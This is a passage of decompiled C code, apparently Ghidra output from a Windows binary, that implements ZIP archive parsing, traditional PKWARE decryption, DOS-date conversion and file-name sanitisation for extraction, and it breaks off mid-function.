char ** __cdecl FUN_00410dc0(char *param_1)

{
  int iVar1;
  char **ppcVar2;
  char **ppcVar3;
  int iVar4;
  char **ppcVar5;
  char *local_90;
  char *local_8c;
  char *local_88;
  char *local_84;
  char *local_80 [3];
  int local_74;
  int local_64;
  char *local_60;
  char *local_5c [22];
  undefined4 local_4;
  
  if (param_1 == (char *)0x0) {
    return (char **)0x0;
  }
  local_64 = FUN_00410c90(param_1);
  iVar4 = 0;
  if (local_64 == -1) {
    iVar4 = local_64;
  }
  iVar1 = FUN_00410a50(param_1,local_64,0);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410c00(param_1,&local_84);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(param_1,&local_90);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(param_1,&local_88);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(param_1,local_80 + 1);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(param_1,&local_8c);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  if (((local_8c != local_80[1]) || (local_88 != (char *)0x0)) || (local_90 != (char *)0x0)) {
    iVar4 = -0x67;
  }
  iVar1 = FUN_00410c00(param_1,&local_60);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410c00(param_1,local_5c);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(param_1,local_80 + 2);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  if ((local_60 + (int)local_5c[0] <= (char *)(*(int *)(param_1 + 0xc) + local_64)) && (iVar4 == 0))
  {
    local_80[0] = param_1;
    local_74 = ((*(int *)(param_1 + 0xc) - (int)local_60) - (int)local_5c[0]) + local_64;
    local_4 = 0;
    *(undefined4 *)(param_1 + 0xc) = 0;
    ppcVar2 = (char **)malloc(0x80);
    iVar4 = 0x20;
    ppcVar3 = local_80;
    ppcVar5 = ppcVar2;
    while (iVar4 != 0) {
      iVar4 = iVar4 + -1;
      *ppcVar5 = *ppcVar3;
      ppcVar3 = ppcVar3 + 1;
      ppcVar5 = ppcVar5 + 1;
    }
    FUN_00411390(ppcVar2);
    return ppcVar2;
  }
  FUN_004109c0(param_1);
  return (char **)0x0;
}

undefined4 __cdecl FUN_00410f70(void **param_1)

{
  if (param_1 == (void **)0x0) {
    return 0xffffff9a;
  }
  if (param_1[0x1f] != (void *)0x0) {
    FUN_00411ac0((int)param_1);
  }
  FUN_004109c0(*param_1);
  free(param_1);
  return 0;
}

void __cdecl FUN_00410fb0(uint param_1,int *param_2)

{
  param_2[3] = param_1 >> 0x10 & 0x1f;
  param_2[5] = (param_1 >> 0x19) + 0x7bc;
  param_2[2] = param_1 >> 0xb & 0x1f;
  param_2[4] = (param_1 >> 0x15 & 0xf) - 1;
  param_2[1] = param_1 >> 5 & 0x3f;
  *param_2 = (param_1 & 0x1f) << 1;
  return;
}

// WARNING: Type propagation algorithm not settling

int __cdecl
FUN_00411000(char **param_1,char **param_2,char **param_3,undefined4 *param_4,uint param_5,
            undefined4 *param_6,uint param_7,undefined4 *param_8,char *param_9)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  char *pcVar5;
  char **ppcVar6;
  char *local_58;
  char *local_54;
  char *local_50 [4];
  char *local_40 [4];
  uint local_30;
  uint local_2c;
  char *local_28 [4];
  int local_18 [6];
  
  iVar4 = 0;
  if (param_1 == (char **)0x0) {
    return -0x66;
  }
  iVar1 = FUN_00410a50(*param_1,(int)(param_1[5] + (int)param_1[3]),0);
  if (iVar1 == 0) {
    iVar1 = FUN_00410c00(*param_1,&local_58);
    if (iVar1 == 0) {
      if (local_58 != (char *)0x2014b50) {
        iVar4 = -0x67;
      }
    }
    else {
      iVar4 = -1;
    }
  }
  else {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_50);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_50 + 1);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_50 + 2);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_50 + 3);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410c00(*param_1,local_50 + 4);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  FUN_00410fb0((uint)local_40[0],local_18);
  iVar1 = FUN_00410c00(*param_1,local_50 + 5);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410c00(*param_1,local_50 + 6);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410c00(*param_1,local_40 + 3);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_40 + 4);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_40 + 5);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_28);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_28 + 1);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410bb0(*param_1,local_28 + 2);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410c00(*param_1,local_28 + 3);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  iVar1 = FUN_00410c00(*param_1,&local_54);
  if (iVar1 != 0) {
    iVar4 = -1;
  }
  if (iVar4 == 0) {
    if (param_4 != (undefined4 *)0x0) {
      uVar3 = param_5;
      if (local_30 < param_5) {
        *(undefined *)(local_30 + (int)param_4) = 0;
        uVar3 = local_30;
      }
      if (((local_30 != 0) && (param_5 != 0)) &&
         (uVar2 = FUN_00410af0(param_4,uVar3,1,*param_1), uVar2 != 1)) {
        iVar4 = -1;
      }
      local_30 = local_30 - uVar3;
      if (iVar4 != 0) goto LAB_00411294;
    }
    if (param_6 != (undefined4 *)0x0) {
      uVar3 = local_2c;
      if (param_7 <= local_2c) {
        uVar3 = param_7;
      }
      if (local_30 != 0) {
        iVar1 = FUN_00410a50(*param_1,local_30,1);
        if (iVar1 == 0) {
          local_30 = 0;
        }
        else {
          iVar4 = -1;
        }
      }
      if (((local_2c != 0) && (param_7 != 0)) &&
         (uVar2 = FUN_00410af0(param_6,uVar3,1,*param_1), uVar2 != 1)) {
        iVar4 = -1;
      }
      local_2c = local_2c - uVar3;
    }
  }
LAB_00411294:
  if (iVar4 == 0) {
    if (param_8 != (undefined4 *)0x0) {
      pcVar5 = param_9;
      if (local_28[0] < param_9) {
        local_28[0][(int)param_8] = '\0';
        pcVar5 = local_28[0];
      }
      if ((local_30 + local_2c != 0) &&
         (iVar1 = FUN_00410a50(*param_1,local_30 + local_2c,1), iVar1 != 0)) {
        iVar4 = -1;
      }
      if (((local_28[0] != (char *)0x0) && (param_9 != (char *)0x0)) &&
         (uVar3 = FUN_00410af0(param_8,(uint)pcVar5,1,*param_1), uVar3 != 1)) {
        return -1;
      }
      if (iVar4 != 0) {
        return iVar4;
      }
    }
    if (param_2 != (char **)0x0) {
      iVar1 = 0x14;
      ppcVar6 = local_50;
      while (iVar1 != 0) {
        iVar1 = iVar1 + -1;
        *param_2 = *ppcVar6;
        ppcVar6 = ppcVar6 + 1;
        param_2 = param_2 + 1;
      }
    }
    if (param_3 != (char **)0x0) {
      *param_3 = local_54;
    }
  }
  return iVar4;
}

void __cdecl
FUN_00411350(char **param_1,char **param_2,undefined4 *param_3,uint param_4,undefined4 *param_5,
            uint param_6,undefined4 *param_7,char *param_8)

{
  FUN_00411000(param_1,param_2,(char **)0x0,param_3,param_4,param_5,param_6,param_7,param_8);
  return;
}

int __cdecl FUN_00411390(char **param_1)

{
  int iVar1;
  
  if (param_1 == (char **)0x0) {
    return -0x66;
  }
  param_1[5] = param_1[9];
  param_1[4] = (char *)0x0;
  iVar1 = FUN_00411000(param_1,param_1 + 10,param_1 + 0x1e,(undefined4 *)0x0,0,(undefined4 *)0x0,0,
                       (undefined4 *)0x0,(char *)0x0);
  param_1[6] = (char *)(uint)(iVar1 == 0);
  return iVar1;
}

int __cdecl FUN_004113e0(char **param_1)

{
  int iVar1;
  
  if (param_1 == (char **)0x0) {
    return -0x66;
  }
  if (param_1[6] == (char *)0x0) {
    return -100;
  }
  if (param_1[4] + 1 == param_1[1]) {
    return -100;
  }
  param_1[5] = param_1[5] + (int)(param_1[0x12] + (int)param_1[0x14] + (int)param_1[0x13] + 0x2e);
  param_1[4] = param_1[4] + 1;
  iVar1 = FUN_00411000(param_1,param_1 + 10,param_1 + 0x1e,(undefined4 *)0x0,0,(undefined4 *)0x0,0,
                       (undefined4 *)0x0,(char *)0x0);
  param_1[6] = (char *)(uint)(iVar1 == 0);
  return iVar1;
}

int __cdecl FUN_00411460(char **param_1,char **param_2,char **param_3,char **param_4)

{
  char **ppcVar1;
  char **ppcVar2;
  char **ppcVar3;
  int iVar4;
  int iVar5;
  char *local_c;
  char *local_8;
  char *local_4;
  
  ppcVar3 = param_2;
  ppcVar2 = param_1;
  iVar5 = 0;
  *param_2 = (char *)0x0;
  *param_3 = (char *)0x0;
  *param_4 = (char *)0x0;
  iVar4 = FUN_00410a50(*param_1,(int)(param_1[3] + (int)param_1[0x1e]),0);
  if (iVar4 != 0) {
    return -1;
  }
  iVar4 = FUN_00410c00(*ppcVar2,&local_8);
  if (iVar4 == 0) {
    if (local_8 != (char *)0x4034b50) {
      iVar5 = -0x67;
    }
  }
  else {
    iVar5 = -1;
  }
  iVar4 = FUN_00410bb0(*ppcVar2,(char **)&param_2);
  if (iVar4 != 0) {
    iVar5 = -1;
  }
  iVar4 = FUN_00410bb0(*ppcVar2,(char **)&param_1);
  if (iVar4 != 0) {
    iVar5 = -1;
  }
  iVar4 = FUN_00410bb0(*ppcVar2,(char **)&param_2);
  if (iVar4 == 0) {
    if ((iVar5 == 0) &&
       ((ppcVar1 = (char **)ppcVar2[0xd], param_2 != ppcVar1 ||
        ((ppcVar1 != (char **)0x0 && (ppcVar1 != (char **)0x8)))))) {
      iVar5 = -0x67;
    }
  }
  else {
    iVar5 = -1;
  }
  iVar4 = FUN_00410c00(*ppcVar2,(char **)&param_2);
  if (iVar4 != 0) {
    iVar5 = -1;
  }
  iVar4 = FUN_00410c00(*ppcVar2,(char **)&param_2);
  if (iVar4 == 0) {
    if (((iVar5 == 0) && (param_2 != (char **)ppcVar2[0xf])) && (((uint)param_1 & 8) == 0)) {
      iVar5 = -0x67;
    }
  }
  else {
    iVar5 = -1;
  }
  iVar4 = FUN_00410c00(*ppcVar2,(char **)&param_2);
  if (iVar4 == 0) {
    if (((iVar5 == 0) && (param_2 != (char **)ppcVar2[0x10])) && (((uint)param_1 & 8) == 0)) {
      iVar5 = -0x67;
    }
  }
  else {
    iVar5 = -1;
  }
  iVar4 = FUN_00410c00(*ppcVar2,(char **)&param_2);
  if (iVar4 == 0) {
    if (((iVar5 == 0) && (param_2 != (char **)ppcVar2[0x11])) && (((uint)param_1 & 8) == 0)) {
      iVar5 = -0x67;
    }
  }
  else {
    iVar5 = -1;
  }
  iVar4 = FUN_00410bb0(*ppcVar2,&local_c);
  if (iVar4 == 0) {
    if ((iVar5 == 0) && (local_c != ppcVar2[0x12])) {
      iVar5 = -0x67;
    }
  }
  else {
    iVar5 = -1;
  }
  *ppcVar3 = *ppcVar3 + (int)local_c;
  iVar4 = FUN_00410bb0(*ppcVar2,&local_4);
  if (iVar4 != 0) {
    iVar5 = -1;
  }
  *param_3 = ppcVar2[0x1e] + 0x1e + (int)local_c;
  *param_4 = local_4;
  *ppcVar3 = *ppcVar3 + (int)local_4;
  return iVar5;
}

undefined4 __cdecl FUN_00411660(char **param_1,byte *param_2)

{
  char *pcVar1;
  char **ppcVar2;
  int iVar3;
  void **_Memory;
  void *pvVar4;
  uint uVar5;
  char *local_8;
  char *local_4;
  
  ppcVar2 = param_1;
  if (param_1 == (char **)0x0) {
    return 0xffffff9a;
  }
  if (param_1[6] == (char *)0x0) {
    return 0xffffff9a;
  }
  if (param_1[0x1f] != (char *)0x0) {
    FUN_00411ac0((int)param_1);
  }
  iVar3 = FUN_00411460(ppcVar2,&local_4,(char **)&param_1,&local_8);
  if (iVar3 != 0) {
    return 0xffffff99;
  }
  _Memory = (void **)malloc(0x84);
  if (_Memory == (void **)0x0) {
    return 0xffffff98;
  }
  pvVar4 = malloc(0x4000);
  *_Memory = pvVar4;
  *(char ***)(_Memory + 0x11) = param_1;
  *(char **)(_Memory + 0x12) = local_8;
  _Memory[0x13] = (void *)0x0;
  if (pvVar4 == (void *)0x0) {
    free(_Memory);
    return 0xffffff98;
  }
  _Memory[0x10] = (void *)0x0;
  pcVar1 = ppcVar2[0xd];
  *(char **)(_Memory + 0x15) = ppcVar2[0xf];
  _Memory[0x14] = (void *)0x0;
  *(char **)(_Memory + 0x19) = ppcVar2[0xd];
  uVar5 = 0;
  *(char **)(_Memory + 0x18) = *ppcVar2;
  *(char **)(_Memory + 0x1a) = ppcVar2[3];
  _Memory[6] = (void *)0x0;
  if (pcVar1 != (char *)0x0) {
    _Memory[9] = (void *)0x0;
    _Memory[10] = (void *)0x0;
    _Memory[0xb] = (void *)0x0;
    uVar5 = FUN_00410380((int)(_Memory + 1));
    if (uVar5 == 0) {
      _Memory[0x10] = (void *)0x1;
    }
  }
  *(char **)(_Memory + 0x16) = ppcVar2[0x10];
  *(char **)(_Memory + 0x17) = ppcVar2[0x11];
  uVar5 = uVar5 & 0xffffff00 | (uint)*(byte *)(ppcVar2 + 0xc) & 0xffffff01;
  *(char *)(_Memory + 0x1b) = (char)((uint)*(byte *)(ppcVar2 + 0xc) & 0xffffff01);
  if (((uint)ppcVar2[0xc] >> 3 & 1) == 0) {
    uVar5 = 0;
    *(char *)(_Memory + 0x20) = (char)((uint)ppcVar2[0xf] >> 0x18);
  }
  else {
    *(char *)(_Memory + 0x20) = (char)((uint)ppcVar2[0xe] >> 8);
  }
  _Memory[0x1c] = (void *)0x12345678;
  _Memory[0x1d] = (void *)0x23456789;
  _Memory[0x1f] = (void *)(-(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc);
  _Memory[0x1e] = (void *)0x34567890;
  if (param_2 != (byte *)0x0) {
    do {
      if (*param_2 == 0) break;
      uVar5 = FUN_004100d0((uint *)(_Memory + 0x1c),uVar5 & 0xffffff00 | (uint)*param_2);
      param_2 = param_2 + 1;
    } while (param_2 != (byte *)0x0);
  }
  pcVar1 = ppcVar2[0x1e];
  _Memory[2] = (void *)0x0;
  *(char **)(_Memory + 0xf) = pcVar1 + 0x1e + (int)local_4;
  *(void ***)(ppcVar2 + 0x1f) = _Memory;
  return 0;
}

uint __cdecl FUN_00411810(int param_1,int param_2,uint param_3,undefined *param_4)

{
  char cVar1;
  int *piVar2;
  byte *pbVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint extraout_EDX;
  uint uVar7;
  uint local_8;
  uint local_4;
  
  local_4 = 0;
  local_8 = 0;
  if (param_4 != (undefined *)0x0) {
    *param_4 = 0;
  }
  if (param_1 == 0) {
    return 0xffffff9a;
  }
  piVar2 = *(int **)(param_1 + 0x7c);
  if (piVar2 == (int *)0x0) {
    return 0xffffff9a;
  }
  if (*piVar2 != 0) {
    if (param_3 == 0) {
      return 0;
    }
    piVar2[5] = param_3;
    piVar2[4] = param_2;
    if ((uint)piVar2[0x17] < param_3) {
      piVar2[5] = piVar2[0x17];
    }
    if (piVar2[5] != 0) {
      do {
        if ((piVar2[2] == 0) && (uVar5 = piVar2[0x16], uVar5 != 0)) {
          uVar6 = 0x4000;
          if ((uVar5 < 0x4000) && (uVar6 = uVar5, uVar5 == 0)) {
            if (param_4 != (undefined *)0x0) {
              *param_4 = 1;
            }
            return 0;
          }
          iVar4 = FUN_00410a50((char *)piVar2[0x18],piVar2[0x1a] + piVar2[0xf],0);
          if ((iVar4 != 0) ||
             (uVar5 = FUN_00410af0((undefined4 *)*piVar2,uVar6,1,(char *)piVar2[0x18]), uVar5 != 1))
          {
            return 0xffffffff;
          }
          iVar4 = *piVar2;
          uVar5 = piVar2[0xf] + uVar6;
          piVar2[0xf] = uVar5;
          piVar2[0x16] = piVar2[0x16] - uVar6;
          piVar2[1] = iVar4;
          piVar2[2] = uVar6;
          if ((*(char *)(piVar2 + 0x1b) != '\0') && (uVar7 = 0, uVar6 != 0)) {
            do {
              uVar5 = FUN_00410150((uint *)(piVar2 + 0x1c),
                                   uVar5 & 0xffffff00 | (uint)*(byte *)(uVar7 + iVar4));
              *(undefined *)(uVar7 + iVar4) = (char)uVar5;
              uVar7 = uVar7 + 1;
              uVar5 = extraout_EDX;
            } while (uVar7 < uVar6);
          }
        }
        uVar5 = piVar2[2];
        uVar6 = piVar2[0x1f];
        if (uVar5 < (uint)piVar2[0x1f]) {
          uVar6 = uVar5;
        }
        if (uVar6 != 0) {
          cVar1 = *(char *)(piVar2[1] + -1 + uVar6);
          piVar2[2] = uVar5 - uVar6;
          iVar4 = piVar2[0x1f];
          piVar2[1] = piVar2[1] + uVar6;
          piVar2[0x1f] = iVar4 - uVar6;
          if ((iVar4 - uVar6 == 0) && (cVar1 != *(char *)(piVar2 + 0x20))) {
            return 0xffffff96;
          }
        }
        if (piVar2[0x19] == 0) {
          uVar5 = piVar2[2];
          if ((uint)piVar2[5] < (uint)piVar2[2]) {
            uVar5 = piVar2[5];
          }
          uVar6 = 0;
          if (uVar5 != 0) {
            do {
              *(undefined *)(piVar2[4] + uVar6) = *(undefined *)(piVar2[1] + uVar6);
              uVar6 = uVar6 + 1;
            } while (uVar6 < uVar5);
          }
          uVar6 = FUN_0040ff90(piVar2[0x14],(byte *)piVar2[4],uVar5);
          iVar4 = piVar2[0x17];
          piVar2[0x14] = uVar6;
          piVar2[0x17] = iVar4 - uVar5;
          piVar2[2] = piVar2[2] - uVar5;
          piVar2[5] = piVar2[5] - uVar5;
          local_8 = local_8 + uVar5;
          piVar2[4] = piVar2[4] + uVar5;
          piVar2[1] = piVar2[1] + uVar5;
          piVar2[6] = piVar2[6] + uVar5;
          if ((iVar4 - uVar5 == 0) && (param_4 != (undefined *)0x0)) {
            *param_4 = 1;
          }
        }
        else {
          iVar4 = piVar2[6];
          pbVar3 = (byte *)piVar2[4];
          local_4 = FUN_00410460((byte **)(piVar2 + 1),2);
          uVar6 = piVar2[6] - iVar4;
          uVar5 = FUN_0040ff90(piVar2[0x14],pbVar3,uVar6);
          iVar4 = piVar2[0x17];
          piVar2[0x14] = uVar5;
          local_8 = local_8 + uVar6;
          piVar2[0x17] = iVar4 - uVar6;
          if ((local_4 == 1) || (iVar4 - uVar6 == 0)) {
            if (param_4 != (undefined *)0x0) {
              *param_4 = 1;
            }
            return local_8;
          }
          if (local_4 != 0) {
            return local_4;
          }
        }
      } while (piVar2[5] != 0);
      if (local_4 != 0) {
        return local_4;
      }
    }
    return local_8;
  }
  return 0xffffff9c;
}

undefined4 __cdecl FUN_00411ac0(int param_1)

{
  void **_Memory;
  undefined4 uVar1;
  
  uVar1 = 0;
  if (param_1 == 0) {
    return 0xffffff9a;
  }
  _Memory = *(void ***)(param_1 + 0x7c);
  if (_Memory == (void **)0x0) {
    return 0xffffff9a;
  }
  if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
    uVar1 = 0xffffff97;
  }
  if (*_Memory != (void *)0x0) {
    free(*_Memory);
    *_Memory = (void *)0x0;
  }
  *_Memory = (void *)0x0;
  if (_Memory[0x10] != (void *)0x0) {
    FUN_00410330((int)(_Memory + 1));
  }
  _Memory[0x10] = (void *)0x0;
  free(_Memory);
  *(undefined4 *)(param_1 + 0x7c) = 0;
  return uVar1;
}

ulonglong __cdecl FUN_00411b50(uint param_1)

{
  ulonglong uVar1;
  
  uVar1 = __allmul(param_1 + 0xb6109100,((int)param_1 >> 0x1f) + 2 + (uint)(0x49ef6eff < param_1),
                   10000000,0);
  return uVar1;
}

_FILETIME __cdecl FUN_00411b80(uint param_1,uint param_2)

{
  _FILETIME local_18;
  SYSTEMTIME local_10;
  
  local_10.wMilliseconds = 0;
  local_10.wDay = (ushort)param_1 & 0x1f;
  local_10.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_10.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_10.wHour = (ushort)param_2 >> 0xb;
  local_10.wSecond = (WORD)((param_2 & 0x1f) << 1);
  local_10.wMinute = (ushort)(param_2 >> 5) & 0x3f;
  SystemTimeToFileTime(&local_10,(LPFILETIME)&local_18);
  return local_18;
}

char ** __thiscall FUN_00411c00(void *this,LPCSTR param_1,undefined4 param_2,int param_3)

{
  char cVar1;
  DWORD DVar2;
  char *pcVar3;
  char **ppcVar4;
  uint uVar5;
  int iVar6;
  uint uVar7;
  undefined4 *puVar8;
  char *pcVar9;
  LPSTR lpBuffer;
  LPSTR pCVar10;
  undefined4 *puVar11;
  char **local_4;
  
  if ((*(int *)this != 0) || (*(int *)((int)this + 4) != -1)) {
    return (char **)0x1000000;
  }
  lpBuffer = (LPSTR)((int)this + 0x140);
  local_4 = (char **)this;
  GetCurrentDirectoryA(0x104,lpBuffer);
  uVar5 = 0xffffffff;
  pCVar10 = lpBuffer;
  do {
    if (uVar5 == 0) break;
    uVar5 = uVar5 - 1;
    cVar1 = *pCVar10;
    pCVar10 = pCVar10 + 1;
  } while (cVar1 != '\0');
  cVar1 = *(char *)(~uVar5 + 0x13e + (int)this);
  if ((cVar1 != '\\') && (cVar1 != '/')) {
    uVar5 = 0xffffffff;
    pcVar3 = &DAT_0042172c;
    do {
      pcVar9 = pcVar3;
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      pcVar9 = pcVar3 + 1;
      cVar1 = *pcVar3;
      pcVar3 = pcVar9;
    } while (cVar1 != '\0');
    uVar5 = ~uVar5;
    iVar6 = -1;
    do {
      pCVar10 = lpBuffer;
      if (iVar6 == 0) break;
      iVar6 = iVar6 + -1;
      pCVar10 = lpBuffer + 1;
      cVar1 = *lpBuffer;
      lpBuffer = pCVar10;
    } while (cVar1 != '\0');
    uVar7 = uVar5 >> 2;
    puVar8 = (undefined4 *)(pcVar9 + -uVar5);
    puVar11 = (undefined4 *)(pCVar10 + -1);
    while (uVar7 != 0) {
      uVar7 = uVar7 - 1;
      *puVar11 = *puVar8;
      puVar8 = puVar8 + 1;
      puVar11 = puVar11 + 1;
    }
    uVar5 = uVar5 & 3;
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *(CHAR *)puVar11 = *(CHAR *)puVar8;
      puVar8 = (undefined4 *)((int)puVar8 + 1);
      puVar11 = (undefined4 *)((int)puVar11 + 1);
    }
  }
  if (param_3 == 1) {
    DVar2 = SetFilePointer(param_1,0,(PLONG)0x0,1);
    if (DVar2 == 0xffffffff) {
      return (char **)0x2000000;
    }
  }
  pcVar3 = FUN_004108a0(param_1,param_2,param_3,&local_4);
  if (pcVar3 == (char *)0x0) {
    return local_4;
  }
  ppcVar4 = FUN_00410dc0(pcVar3);
  *(char ***)this = ppcVar4;
  return (char **)((-(uint)(ppcVar4 != (char **)0x0) & 0xfffffe00) + 0x200);
}

undefined4 __thiscall FUN_00411cf0(void *this,char *param_1,char **param_2)

{
  undefined *puVar1;
  int iVar2;
  int iVar3;
  char cVar4;
  byte bVar5;
  char *pcVar6;
  uchar *puVar7;
  byte *pbVar8;
  int iVar9;
  byte bVar10;
  int iVar11;
  uint uVar12;
  uint uVar13;
  byte *pbVar14;
  byte bVar15;
  char **ppcVar16;
  undefined4 *_Str;
  char **ppcVar17;
  undefined4 *puVar18;
  bool bVar19;
  ulonglong uVar20;
  byte local_282;
  byte local_281;
  char *local_280;
  byte local_27c [4];
  undefined4 *local_278;
  void *local_274;
  char *local_270;
  _FILETIME local_26c;
  FILETIME local_264;
  char *local_25c;
  char *local_258 [4];
  uint local_248;
  char *local_240;
  char *local_23c;
  uint local_224;
  undefined4 local_208 [65];
  undefined4 local_104 [65];
  
  if (((int)param_1 < -1) || (*(int *)(*(int *)this + 4) <= (int)param_1)) {
    return 0x10000;
  }
  local_274 = this;
  if (*(int *)((int)this + 4) != -1) {
    FUN_00411ac0(*(int *)this);
  }
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if (param_1 == *(char **)((int)this + 0x134)) {
    if (param_1 != (char *)0xffffffff) {
      iVar11 = 0x4b;
      ppcVar16 = (char **)((int)this + 8);
      while (iVar11 != 0) {
        iVar11 = iVar11 + -1;
        *param_2 = *ppcVar16;
        ppcVar16 = ppcVar16 + 1;
        param_2 = param_2 + 1;
      }
      return 0;
    }
  }
  else {
    if (param_1 != (char *)0xffffffff) {
      if ((int)param_1 < (int)(*(char ***)this)[4]) {
        FUN_00411390(*(char ***)this);
      }
      ppcVar16 = *(char ***)this;
      pcVar6 = ppcVar16[4];
      while ((int)pcVar6 < (int)param_1) {
        FUN_004113e0(ppcVar16);
        ppcVar16 = *(char ***)this;
        pcVar6 = ppcVar16[4];
      }
      FUN_00411350(*(char ***)this,local_258,local_208,0x104,(undefined4 *)0x0,0,(undefined4 *)0x0,
                   (char *)0x0);
      iVar11 = FUN_00411460(*(char ***)this,&local_25c,&local_270,&local_280);
      if (iVar11 != 0) {
        return 0x700;
      }
      iVar11 = FUN_00410a50(**(char ***)this,(int)local_270,0);
      if (iVar11 != 0) {
        return 0x800;
      }
      _Str = (undefined4 *)operator_new((uint)local_280);
      local_278 = _Str;
      pcVar6 = (char *)FUN_00410af0(_Str,1,(int)local_280,**(char ***)this);
      if (pcVar6 != local_280) {
        operator_delete(_Str);
        return 0x800;
      }
      uVar12 = 0xffffffff;
      _Str = local_208;
      do {
        puVar18 = _Str;
        if (uVar12 == 0) break;
        uVar12 = uVar12 - 1;
        puVar18 = (undefined4 *)((int)_Str + 1);
        cVar4 = *(char *)_Str;
        _Str = puVar18;
      } while (cVar4 != '\0');
      uVar12 = ~uVar12;
      *param_2 = *(char **)(*(int *)this + 0x10);
      uVar13 = uVar12 >> 2;
      _Str = (undefined4 *)((int)puVar18 - uVar12);
      puVar18 = local_104;
      while (uVar13 != 0) {
        uVar13 = uVar13 - 1;
        *puVar18 = *_Str;
        _Str = _Str + 1;
        puVar18 = puVar18 + 1;
      }
      uVar12 = uVar12 & 3;
      while (uVar12 != 0) {
        uVar12 = uVar12 - 1;
        *(undefined *)puVar18 = *(undefined *)_Str;
        _Str = (undefined4 *)((int)_Str + 1);
        puVar18 = (undefined4 *)((int)puVar18 + 1);
      }
      _Str = local_104;
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while ((cVar4 = *(char *)_Str, cVar4 != '\0' && (*(char *)((int)_Str + 1) == ':'))
                        ) {
                    _Str = (undefined4 *)((int)_Str + 2);
                  }
                  if (cVar4 != '\\') break;
                  _Str = (undefined4 *)((int)_Str + 1);
                }
                if (cVar4 != '/') break;
                _Str = (undefined4 *)((int)_Str + 1);
              }
              puVar7 = _mbsstr((uchar *)_Str,(uchar *)&_Substr_0042174c);
              if (puVar7 == (uchar *)0x0) break;
              _Str = (undefined4 *)(puVar7 + 4);
            }
            puVar7 = _mbsstr((uchar *)_Str,(uchar *)&_Substr_00421744);
            if (puVar7 == (uchar *)0x0) break;
            _Str = (undefined4 *)(puVar7 + 4);
          }
          puVar7 = _mbsstr((uchar *)_Str,(uchar *)&_Substr_0042173c);
          if (puVar7 == (uchar *)0x0) break;
          _Str = (undefined4 *)(puVar7 + 4);
        }
        puVar7 = _mbsstr((uchar *)_Str,(uchar *)&_Substr_00421734);
        if (puVar7 == (uchar *)0x0) break;
        _Str = (undefined4 *)(puVar7 + 4);
      }
      uVar12 = 0xffffffff;
      do {
        puVar18 = _Str;
        if (uVar12 == 0) break;
        uVar12 = uVar12 - 1;
        puVar18 = (undefined4 *)((int)_Str + 1);
        cVar4 = *(char *)_Str;
        _Str = puVar18;
      } while (cVar4 != '\0');
      uVar12 = ~uVar12;
      uVar13 = uVar12 >> 2;
      ppcVar17 = (char **)((int)puVar18 - uVar12);
      ppcVar16 = param_2;
      while (ppcVar16 = ppcVar16 + 1, uVar13 != 0) {
        uVar13 = uVar13 - 1;
        *ppcVar16 = *ppcVar17;
        ppcVar17 = ppcVar17 + 1;
      }
      uVar12 = uVar12 & 3;
      local_281 = 0;
      while (uVar12 != 0) {
        uVar12 = uVar12 - 1;
        *(undefined *)ppcVar16 = *(undefined *)ppcVar17;
        ppcVar17 = (char **)((int)ppcVar17 + 1);
        ppcVar16 = (char **)((int)ppcVar16 + 1);
      }
      bVar10 = ~(byte)(local_224 >> 0x17);
      bVar5 = (byte)(local_224 >> 0x1e);
      uVar12 = (uint)local_258[0] >> 8;
      local_282 = 0;
      bVar15 = 1;
      if ((((uVar12 == 0) || (uVar12 == 7)) || (uVar12 == 0xb)) || (uVar12 == 0xe)) {
        bVar10 = (byte)local_224;
        local_281 = (byte)(local_224 >> 1) & 1;
        local_282 = (byte)(local_224 >> 2) & 1;
        bVar5 = (byte)(local_224 >> 4);
        bVar15 = (byte)(local_224 >> 5) & 1;
      }
      iVar11 = 0;
      param_2[0x42] = (char *)0x0;
      if ((bVar5 & 1) != 0) {
        param_2[0x42] = (char *)0x10;
      }
      if (bVar15 != 0) {
        param_2[0x42] = (char *)((uint)param_2[0x42] | 0x20);
      }
      if (local_281 != 0) {
        param_2[0x42] = (char *)((uint)param_2[0x42] | 2);
      }
      if ((bVar10 & 1) != 0) {
